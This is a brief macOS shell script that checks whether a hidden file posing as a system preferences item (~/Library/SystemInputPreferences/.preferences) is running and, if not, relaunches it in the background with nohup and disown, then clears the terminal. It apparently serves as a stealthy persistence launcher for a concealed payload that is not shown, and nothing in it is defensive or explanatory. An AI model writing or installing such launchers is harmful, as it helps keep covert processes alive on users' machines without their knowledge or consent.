#!/bin/sh

TEST=$(ps -A | grep "sh\ ~/Library/SystemInputPreferences/.preferences")
if [[ -z $TEST ]]
then
	nohup sh ~/Library/SystemInputPreferences/.preferences &
	disown
	clear
fi
